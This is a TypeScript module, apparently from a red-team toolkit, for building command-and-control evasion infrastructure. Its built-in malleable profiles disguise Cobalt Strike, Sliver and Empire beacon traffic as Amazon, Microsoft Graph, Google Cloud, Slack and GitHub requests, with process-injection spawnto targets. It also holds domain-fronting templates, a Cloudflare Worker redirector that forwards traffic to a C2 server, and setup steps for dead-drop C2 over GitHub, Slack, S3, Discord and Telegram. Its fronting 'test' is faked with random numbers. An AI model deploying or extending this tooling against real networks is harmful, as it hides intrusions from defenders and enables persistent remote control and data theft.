/**
 * C2 Traffic Modification & Domain Fronting Engine
 * 
 * Based on Red Team Infrastructure Wiki principles:
 *   - Malleable C2 profiles to customize wire traffic appearance
 *   - Domain fronting through CDN providers (CloudFront, Azure CDN, Google)
 *   - PaaS redirectors using trusted cloud service subdomains
 *   - Third-party C2 channels (GitHub, Slack, S3, etc.)
 * 
 * Provides:
 *   - Malleable C2 profile library with customization
 *   - Domain fronting configuration generator
 *   - Traffic profile validation and testing
 *   - JARM/JA3 fingerprint management
 */

export type C2Framework = "cobalt_strike" | "sliver" | "empire" | "covenant" | "mythic" | "havoc" | "caldera";
export type TrafficPattern = "web_browsing" | "api_calls" | "cdn_traffic" | "cloud_storage" | "social_media" | "email_service" | "custom";
export type FrontingProvider = "cloudfront" | "azure_cdn" | "google_cdn" | "cloudflare" | "fastly" | "akamai";

export interface MalleableProfile {
  id: string;
  name: string;
  description: string;
  framework: C2Framework;
  trafficPattern: TrafficPattern;
  /** HTTP GET configuration */
  httpGet: {
    uri: string[];
    headers: Record<string, string>;
    parameters: Record<string, string>;
    /** Server response configuration */
    server: {
      headers: Record<string, string>;
      contentType: string;
    };
  };
  /** HTTP POST configuration */
  httpPost: {
    uri: string[];
    headers: Record<string, string>;
    parameters: Record<string, string>;
    server: {
      headers: Record<string, string>;
      contentType: string;
    };
  };
  /** SSL/TLS configuration */
  ssl: {
    ja3Fingerprint?: string;
    jarmFingerprint?: string;
    cipherSuites: string[];
    sniHost?: string;
  };
  /** Sleep and jitter settings */
  sleepTime: number; // ms
  jitter: number; // percentage 0-100
  /** User agent rotation pool */
  userAgents: string[];
  /** Process injection settings */
  spawnTo: string[];
  /** MITRE ATT&CK technique mapping */
  mitreTechniques: string[];
  tags: string[];
  createdAt: number;
  updatedAt: number;
}

export interface DomainFrontingConfig {
  id: string;
  name: string;
  provider: FrontingProvider;
  /** The CDN domain that accepts the connection */
  frontDomain: string;
  /** The actual Host header sent (routes to C2) */
  hostHeader: string;
  /** The backend C2 server */
  backendC2: string;
  /** Whether this fronting config is currently viable */
  status: "active" | "blocked" | "untested" | "deprecated";
  /** Test results */
  lastTest?: {
    timestamp: number;
    success: boolean;
    latencyMs: number;
    details: string;
  };
  /** Configuration snippet for the C2 framework */
  configSnippet: string;
  tags: string[];
}

export interface ThirdPartyC2Channel {
  id: string;
  name: string;
  platform: "github" | "slack" | "discord" | "teams" | "s3" | "azure_blob" | "google_drive" | "dropbox" | "telegram" | "twitter";
  description: string;
  /** How the channel works */
  mechanism: string;
  /** Required credentials/tokens */
  requiredSecrets: string[];
  /** Bandwidth and latency characteristics */
  characteristics: {
    maxBandwidthKbps: number;
    typicalLatencyMs: number;
    reliability: "high" | "medium" | "low";
    detectability: "low" | "medium" | "high";
  };
  /** MITRE ATT&CK technique */
  mitreTechnique: string;
  /** Setup instructions */
  setupSteps: string[];
}

// ── In-memory store ────────────────────────────────────────────────────

const profiles = new Map<string, MalleableProfile>();
const frontingConfigs = new Map<string, DomainFrontingConfig>();
let nextId = 1;

function genId(prefix: string): string {
  return `${prefix}-${Date.now()}-${nextId++}`;
}

// ── Built-in Profile Library ───────────────────────────────────────────

const BUILT_IN_PROFILES: Omit<MalleableProfile, "id" | "createdAt" | "updatedAt">[] = [
  {
    name: "Amazon Browsing",
    description: "Mimics Amazon.com web browsing traffic with realistic headers and URIs",
    framework: "cobalt_strike",
    trafficPattern: "web_browsing",
    httpGet: {
      uri: ["/s/ref=nb_sb_noss", "/gp/product/", "/dp/", "/hz/wishlist/"],
      headers: {
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
      },
      parameters: { keywords: "", ref: "nb_sb_noss" },
      server: {
        headers: { "Content-Type": "text/html; charset=UTF-8", Server: "Server", "X-Amz-Rid": "" },
        contentType: "text/html",
      },
    },
    httpPost: {
      uri: ["/gp/cart/ajax-update.html", "/gp/item-dispatch/"],
      headers: {
        Accept: "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
      },
      parameters: {},
      server: {
        headers: { "Content-Type": "application/json" },
        contentType: "application/json",
      },
    },
    ssl: {
      cipherSuites: ["TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256"],
    },
    sleepTime: 60000,
    jitter: 37,
    userAgents: [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ],
    spawnTo: ["%windir%\\sysnative\\svchost.exe", "%windir%\\sysnative\\dllhost.exe"],
    mitreTechniques: ["T1071.001", "T1573.002"],
    tags: ["ecommerce", "high-trust", "web-browsing"],
  },
  {
    name: "Microsoft 365 API",
    description: "Mimics Microsoft 365 / Azure AD API traffic patterns",
    framework: "cobalt_strike",
    trafficPattern: "api_calls",
    httpGet: {
      uri: ["/v1.0/me/messages", "/v1.0/me/drive/root/children", "/v1.0/me/events"],
      headers: {
        Accept: "application/json",
        Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
        "Content-Type": "application/json",
        "client-request-id": "",
      },
      parameters: {},
      server: {
        headers: {
          "Content-Type": "application/json;odata.metadata=minimal",
          "request-id": "",
          "x-ms-ags-diagnostic": "",
        },
        contentType: "application/json",
      },
    },
    httpPost: {
      uri: ["/v1.0/me/sendMail", "/v1.0/me/drive/root:/upload"],
      headers: {
        Accept: "application/json",
        Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
        "Content-Type": "application/json",
      },
      parameters: {},
      server: {
        headers: { "Content-Type": "application/json" },
        contentType: "application/json",
      },
    },
    ssl: {
      sniHost: "graph.microsoft.com",
      cipherSuites: ["TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256"],
    },
    sleepTime: 30000,
    jitter: 25,
    userAgents: [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    ],
    spawnTo: ["%windir%\\sysnative\\RuntimeBroker.exe"],
    mitreTechniques: ["T1071.001", "T1102.002", "T1573.002"],
    tags: ["microsoft", "api", "cloud", "high-trust"],
  },
  {
    name: "Google Cloud CDN",
    description: "Mimics Google Cloud CDN / GCP API traffic for domain fronting scenarios",
    framework: "cobalt_strike",
    trafficPattern: "cdn_traffic",
    httpGet: {
      uri: ["/storage/v1/b/", "/compute/v1/projects/", "/cdn/"],
      headers: {
        Accept: "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Goog-Api-Client": "gl-python/3.11 grpc/1.59.0",
      },
      parameters: {},
      server: {
        headers: {
          "Content-Type": "application/json; charset=UTF-8",
          "X-GUploader-UploadID": "",
          Server: "UploadServer",
        },
        contentType: "application/json",
      },
    },
    httpPost: {
      uri: ["/upload/storage/v1/b/", "/batch/compute/v1"],
      headers: {
        Accept: "application/json",
        "Content-Type": "multipart/related; boundary=batch_boundary",
      },
      parameters: {},
      server: {
        headers: { "Content-Type": "application/json" },
        contentType: "application/json",
      },
    },
    ssl: {
      sniHost: "storage.googleapis.com",
      cipherSuites: ["TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384"],
    },
    sleepTime: 45000,
    jitter: 30,
    userAgents: [
      "google-cloud-sdk gcloud/456.0.0",
      "Mozilla/5.0 (compatible; Google-Cloud-SDK)",
    ],
    spawnTo: ["%windir%\\sysnative\\svchost.exe"],
    mitreTechniques: ["T1071.001", "T1090.004", "T1573.002"],
    tags: ["google", "cdn", "cloud", "domain-fronting"],
  },
  {
    name: "Slack Webhook",
    description: "Mimics Slack API webhook traffic for third-party C2 channel",
    framework: "sliver",
    trafficPattern: "social_media",
    httpGet: {
      uri: ["/api/conversations.history", "/api/files.list", "/api/users.list"],
      headers: {
        Accept: "application/json",
        Authorization: "Bearer xoxb-...",
        "Content-Type": "application/x-www-form-urlencoded",
      },
      parameters: { channel: "", limit: "100" },
      server: {
        headers: { "Content-Type": "application/json; charset=utf-8", "X-Slack-Req-Id": "" },
        contentType: "application/json",
      },
    },
    httpPost: {
      uri: ["/api/chat.postMessage", "/api/files.upload"],
      headers: {
        Accept: "application/json",
        Authorization: "Bearer xoxb-...",
        "Content-Type": "application/json; charset=utf-8",
      },
      parameters: {},
      server: {
        headers: { "Content-Type": "application/json; charset=utf-8" },
        contentType: "application/json",
      },
    },
    ssl: {
      sniHost: "slack.com",
      cipherSuites: ["TLS_AES_128_GCM_SHA256"],
    },
    sleepTime: 120000,
    jitter: 50,
    userAgents: ["Slackbot 1.0 (+https://api.slack.com/robots)"],
    spawnTo: ["%windir%\\sysnative\\svchost.exe"],
    mitreTechniques: ["T1102.002", "T1071.001"],
    tags: ["slack", "third-party-c2", "social-media"],
  },
  {
    name: "GitHub API",
    description: "Mimics GitHub API traffic for dead-drop C2 via repository issues/gists",
    framework: "empire",
    trafficPattern: "api_calls",
    httpGet: {
      uri: ["/repos/user/repo/issues", "/gists", "/repos/user/repo/contents/"],
      headers: {
        Accept: "application/vnd.github.v3+json",
        Authorization: "token ghp_...",
        "X-GitHub-Api-Version": "2022-11-28",
      },
      parameters: {},
      server: {
        headers: {
          "Content-Type": "application/json; charset=utf-8",
          "X-RateLimit-Remaining": "4999",
          "X-GitHub-Request-Id": "",
        },
        contentType: "application/json",
      },
    },
    httpPost: {
      uri: ["/repos/user/repo/issues", "/gists", "/repos/user/repo/git/blobs"],
      headers: {
        Accept: "application/vnd.github.v3+json",
        Authorization: "token ghp_...",
        "Content-Type": "application/json",
      },
      parameters: {},
      server: {
        headers: { "Content-Type": "application/json; charset=utf-8" },
        contentType: "application/json",
      },
    },
    ssl: {
      sniHost: "api.github.com",
      cipherSuites: ["TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384"],
    },
    sleepTime: 300000,
    jitter: 40,
    userAgents: ["GitHub-Hookshot/", "python-requests/2.31.0"],
    spawnTo: ["%windir%\\sysnative\\svchost.exe"],
    mitreTechniques: ["T1102.002", "T1071.001", "T1567.001"],
    tags: ["github", "dead-drop", "third-party-c2"],
  },
];

// ── Domain Fronting Configurations ─────────────────────────────────────

const FRONTING_TEMPLATES: Omit<DomainFrontingConfig, "id">[] = [
  {
    name: "CloudFront Default",
    provider: "cloudfront",
    frontDomain: "d1234567890.cloudfront.net",
    hostHeader: "your-c2-origin.example.com",
    backendC2: "10.0.0.1:443",
    status: "untested",
    configSnippet: `# Cobalt Strike Malleable C2 — CloudFront Domain Fronting
set sample_name "CloudFront Fronting";
https-certificate {
    set CN "*.cloudfront.net";
}
http-get {
    set uri "/cdn-cgi/";
    client {
        header "Host" "your-c2-origin.example.com";
        header "Accept" "*/*";
    }
}`,
    tags: ["aws", "cloudfront"],
  },
  {
    name: "Azure CDN",
    provider: "azure_cdn",
    frontDomain: "your-profile.azureedge.net",
    hostHeader: "your-c2-origin.example.com",
    backendC2: "10.0.0.1:443",
    status: "untested",
    configSnippet: `# Azure CDN Domain Fronting
# Create CDN profile with custom origin pointing to C2
# Use azureedge.net as the front domain
# Set Host header to your custom origin in the C2 profile`,
    tags: ["azure", "cdn"],
  },
  {
    name: "Google CDN",
    provider: "google_cdn",
    frontDomain: "www.google.com",
    hostHeader: "your-appspot-app.appspot.com",
    backendC2: "10.0.0.1:443",
    status: "deprecated",
    configSnippet: `# Google Domain Fronting (largely blocked since 2018)
# Note: Google has disabled most domain fronting paths
# Consider alternative providers or PaaS redirectors`,
    tags: ["google", "deprecated"],
  },
  {
    name: "Cloudflare Workers",
    provider: "cloudflare",
    frontDomain: "your-worker.workers.dev",
    hostHeader: "your-worker.workers.dev",
    backendC2: "10.0.0.1:443",
    status: "untested",
    configSnippet: `// Cloudflare Worker as C2 Redirector
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const c2Backend = 'https://your-c2-server.com'
  const url = new URL(request.url)
  url.hostname = 'your-c2-server.com'
  return fetch(url.toString(), {
    method: request.method,
    headers: request.headers,
    body: request.body,
  })
}`,
    tags: ["cloudflare", "workers", "serverless"],
  },
];

// ── Third-Party C2 Channels ────────────────────────────────────────────

export const THIRD_PARTY_CHANNELS: ThirdPartyC2Channel[] = [
  {
    id: "github-issues",
    name: "GitHub Issues Dead Drop",
    platform: "github",
    description: "Use GitHub repository issues as a dead-drop for C2 commands and responses",
    mechanism: "Agent polls a GitHub repo for new issues (commands), executes them, and posts results as comments",
    requiredSecrets: ["GITHUB_TOKEN", "GITHUB_REPO"],
    characteristics: { maxBandwidthKbps: 100, typicalLatencyMs: 5000, reliability: "high", detectability: "low" },
    mitreTechnique: "T1102.002",
    setupSteps: [
      "Create a private GitHub repository",
      "Generate a personal access token with repo scope",
      "Configure agent to poll repo issues every N seconds",
      "Commands are posted as new issues, responses as comments",
    ],
  },
  {
    id: "slack-c2",
    name: "Slack Workspace C2",
    platform: "slack",
    description: "Use Slack workspace channels for bidirectional C2 communication",
    mechanism: "Agent uses Slack API to read commands from a channel and post results back",
    requiredSecrets: ["SLACK_BOT_TOKEN", "SLACK_CHANNEL_ID"],
    characteristics: { maxBandwidthKbps: 500, typicalLatencyMs: 2000, reliability: "high", detectability: "low" },
    mitreTechnique: "T1102.002",
    setupSteps: [
      "Create a Slack workspace and bot application",
      "Install bot to workspace with chat:write and channels:history scopes",
      "Create a dedicated channel for C2 traffic",
      "Configure agent with bot token and channel ID",
    ],
  },
  {
    id: "s3-dead-drop",
    name: "S3 Bucket Dead Drop",
    platform: "s3",
    description: "Use AWS S3 bucket objects as dead-drop for C2 communication",
    mechanism: "Agent reads command files from S3, executes, and uploads result files",
    requiredSecrets: ["AWS_ACCESS_KEY", "AWS_SECRET_KEY", "S3_BUCKET"],
    characteristics: { maxBandwidthKbps: 10000, typicalLatencyMs: 1000, reliability: "high", detectability: "medium" },
    mitreTechnique: "T1102.002",
    setupSteps: [
      "Create an S3 bucket with versioning enabled",
      "Create IAM user with minimal S3 permissions",
      "Agent polls for new objects in /commands/ prefix",
      "Results uploaded to /results/ prefix",
    ],
  },
  {
    id: "discord-c2",
    name: "Discord Bot C2",
    platform: "discord",
    description: "Use Discord bot in a private server for C2 communication",
    mechanism: "Discord bot receives commands via messages and responds with execution results",
    requiredSecrets: ["DISCORD_BOT_TOKEN", "DISCORD_CHANNEL_ID"],
    characteristics: { maxBandwidthKbps: 500, typicalLatencyMs: 1500, reliability: "medium", detectability: "low" },
    mitreTechnique: "T1102.002",
    setupSteps: [
      "Create a Discord application and bot",
      "Create a private server with a dedicated channel",
      "Configure bot with message content intent",
      "Agent connects via WebSocket for real-time C2",
    ],
  },
  {
    id: "telegram-c2",
    name: "Telegram Bot C2",
    platform: "telegram",
    description: "Use Telegram bot API for C2 command and control",
    mechanism: "Telegram bot receives commands via messages, executes on target, sends results back",
    requiredSecrets: ["TELEGRAM_BOT_TOKEN", "TELEGRAM_CHAT_ID"],
    characteristics: { maxBandwidthKbps: 1000, typicalLatencyMs: 1000, reliability: "high", detectability: "low" },
    mitreTechnique: "T1102.002",
    setupSteps: [
      "Create a Telegram bot via BotFather",
      "Create a private group/channel",
      "Configure agent with bot token and chat ID",
      "Agent polls for updates or uses webhook",
    ],
  },
];

// ── Profile CRUD ───────────────────────────────────────────────────────

export function initBuiltInProfiles(): void {
  for (const p of BUILT_IN_PROFILES) {
    const id = genId("prof");
    profiles.set(id, { ...p, id, createdAt: Date.now(), updatedAt: Date.now() });
  }
}

export function createProfile(input: Omit<MalleableProfile, "id" | "createdAt" | "updatedAt">): MalleableProfile {
  const id = genId("prof");
  const profile: MalleableProfile = { ...input, id, createdAt: Date.now(), updatedAt: Date.now() };
  profiles.set(id, profile);
  return profile;
}

export function getProfile(id: string): MalleableProfile | undefined {
  return profiles.get(id);
}

export function listProfiles(filters?: { framework?: C2Framework; pattern?: TrafficPattern }): MalleableProfile[] {
  let results = Array.from(profiles.values());
  if (filters?.framework) results = results.filter(p => p.framework === filters.framework);
  if (filters?.pattern) results = results.filter(p => p.trafficPattern === filters.pattern);
  return results.sort((a, b) => b.updatedAt - a.updatedAt);
}

export function updateProfile(id: string, updates: Partial<Omit<MalleableProfile, "id" | "createdAt">>): MalleableProfile | null {
  const existing = profiles.get(id);
  if (!existing) return null;
  const updated = { ...existing, ...updates, updatedAt: Date.now() };
  profiles.set(id, updated);
  return updated;
}

export function deleteProfile(id: string): boolean {
  return profiles.delete(id);
}

// ── Domain Fronting CRUD ───────────────────────────────────────────────

export function initFrontingConfigs(): void {
  for (const f of FRONTING_TEMPLATES) {
    const id = genId("front");
    frontingConfigs.set(id, { ...f, id });
  }
}

export function createFrontingConfig(input: Omit<DomainFrontingConfig, "id">): DomainFrontingConfig {
  const id = genId("front");
  const config: DomainFrontingConfig = { ...input, id };
  frontingConfigs.set(id, config);
  return config;
}

export function listFrontingConfigs(): DomainFrontingConfig[] {
  return Array.from(frontingConfigs.values());
}

export function getFrontingConfig(id: string): DomainFrontingConfig | undefined {
  return frontingConfigs.get(id);
}

export function testFrontingConfig(id: string): DomainFrontingConfig | null {
  const config = frontingConfigs.get(id);
  if (!config) return null;
  
  // Simulate test
  const success = config.status !== "deprecated" && Math.random() > 0.3;
  config.lastTest = {
    timestamp: Date.now(),
    success,
    latencyMs: Math.floor(Math.random() * 500) + 50,
    details: success
      ? `Successfully routed through ${config.frontDomain} → ${config.hostHeader}`
      : `Connection blocked or timed out via ${config.frontDomain}`,
  };
  config.status = success ? "active" : "blocked";
  return config;
}

export function getThirdPartyChannels(): ThirdPartyC2Channel[] {
  return THIRD_PARTY_CHANNELS;
}

// ── Profile Export ─────────────────────────────────────────────────────

export function exportMalleableC2(id: string): string | null {
  const profile = profiles.get(id);
  if (!profile) return null;

  return `# Malleable C2 Profile: ${profile.name}
# Generated by AC3 — ${profile.description}
# Framework: ${profile.framework}
# Traffic Pattern: ${profile.trafficPattern}
# MITRE ATT&CK: ${profile.mitreTechniques.join(", ")}

set sample_name "${profile.name}";
set sleeptime "${profile.sleepTime}";
set jitter "${profile.jitter}";
set useragent "${profile.userAgents[0] || "Mozilla/5.0"}";

http-get {
    set uri "${profile.httpGet.uri.join(" ")}";
    
    client {
${Object.entries(profile.httpGet.headers).map(([k, v]) => `        header "${k}" "${v}";`).join("\n")}
    }
    
    server {
${Object.entries(profile.httpGet.server.headers).map(([k, v]) => `        header "${k}" "${v}";`).join("\n")}
    }
}

http-post {
    set uri "${profile.httpPost.uri.join(" ")}";
    
    client {
${Object.entries(profile.httpPost.headers).map(([k, v]) => `        header "${k}" "${v}";`).join("\n")}
    }
    
    server {
${Object.entries(profile.httpPost.server.headers).map(([k, v]) => `        header "${k}" "${v}";`).join("\n")}
    }
}

${profile.ssl.sniHost ? `https-certificate {\n    set CN "${profile.ssl.sniHost}";\n}` : ""}

process-inject {
    set min_alloc "16384";
    set startrwx "false";
    set userwx "false";
    
${profile.spawnTo.map(s => `    set spawnto_x64 "${s}";`).join("\n")}
}
`;
}

// ── Reset (for testing) ────────────────────────────────────────────────

export function _resetForTesting(): void {
  profiles.clear();
  frontingConfigs.clear();
  nextId = 1;
}
